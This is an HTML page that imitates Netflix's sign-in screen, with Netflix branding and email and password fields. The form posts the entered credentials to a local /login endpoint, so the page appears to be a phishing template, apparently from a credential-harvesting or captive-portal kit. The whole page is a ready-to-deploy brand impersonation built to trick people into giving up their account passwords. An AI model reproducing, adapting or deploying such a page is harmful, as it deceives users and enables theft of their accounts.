<title>Netflix</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;
min-height:100vh;display:flex;align-items:center;justify-content:center}
.bg{position:fixed;inset:0;background:linear-gradient(rgba(0,0,0,.7),rgba(0,0,0,.9));z-index:0}
.wrap{position:relative;z-index:1;width:100%;max-width:450px}
.header{padding:20px 0}
.header .nf{color:#e50914;font-size:2rem;font-weight:700;letter-spacing:-1px}
.card{background:rgba(0,0,0,.75);border-radius:4px;padding:60px 68px 40px}
h1{color:#fff;font-size:2rem;font-weight:700;margin-bottom:28px}
.input-wrap{position:relative;margin-bottom:16px}
.input-wrap input{width:100%;padding:16px 20px 0;background:#333;border:none;
border-radius:4px;color:#fff;font-size:16px;height:50px;outline:none}
.input-wrap input:focus{background:#454545}
.input-wrap label{position:absolute;top:14px;left:20px;color:#8c8c8c;
font-size:14px;transition:all .2s;pointer-events:none}
.input-wrap input:focus+label,.input-wrap input:not(:placeholder-shown)+label{
top:4px;font-size:11px;color:#b3b3b3}
.btn{width:100%;padding:16px;background:#e50914;color:#fff;border:none;
border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:24px}
.btn:hover{background:#f40612}
.remember{display:flex;align-items:center;justify-content:space-between;
margin-top:12px;color:#b3b3b3;font-size:13px}
.remember a{color:#b3b3b3;text-decoration:none}
.remember a:hover{text-decoration:underline}
.new{margin-top:16px;color:#737373;font-size:16px}
.new a{color:#fff;text-decoration:none}
.captcha{margin-top:12px;color:#737373;font-size:13px}
@media(max-width:500px){.card{padding:40px 28px 28px}}
</style>
</head>

<div class="bg"></div>
<div class="wrap">
<div class="header"><div class="nf">NETFLIX</div></div>

<h1 data-i18n="title">Sign In</h1>
<form method="POST" action="/login">
<div class="input-wrap">
<input type="text" name="username" id="email" placeholder=" " required autocomplete="off">
<label for="email" data-i18n="email_label">Email or phone number</label>
</div>
<div class="input-wrap">
<input type="password" name="password" id="pass" placeholder=" " required>
<label for="pass" data-i18n="pass_label">Password</label>
</div>
<button type="submit" class="btn" data-i18n="signin">Sign In</button>
</form>
<div class="remember">
<label><input type="checkbox" checked> <span data-i18n="remember">Remember me</span></label>
<a href="#" data-i18n="help">Need help?</a>
</div>
<div class="new"><span data-i18n="new_q">New to Netflix?</span> <a href="#" data-i18n="signup">Sign up now.</a></div>
